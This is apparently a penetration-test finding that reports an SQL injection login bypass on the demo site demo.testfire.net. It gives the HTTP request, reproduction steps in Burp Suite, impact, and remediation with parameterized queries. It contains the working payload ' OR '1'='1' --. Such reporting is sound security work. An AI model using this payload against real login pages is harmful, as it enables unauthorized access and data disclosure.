Vulnerability 1 – SQL Injection

Description

The login page does not properly validate user input, allowing SQL Injection to bypass authentication.

CVSS Score

8.8 (High)

URL

http://demo.testfire.net/login.jsp

HTTP Request

POST /login.jsp HTTP/1.1
Host: demo.testfire.net

uid=' OR '1'='1' --
pass=test

HTTP Response

HTTP/1.1 200 OK

Login Successful

OWASP Category

OWASP Top 10 2021 – A03: Injection

Payload Used

' OR '1'='1' --

Steps to Reproduce

1. Open Login page.


2. Intercept request using Burp Suite.


3. Replace username with ' OR '1'='1' --.


4. Send the request.


5. Observe successful login or SQL error.



Screenshots

Burp Suite request

Burp response

Browser output


Impact

Authentication bypass

Database information disclosure

Unauthorized access


Remediation

Use prepared statements.

Validate user input.

Use parameterized queries.



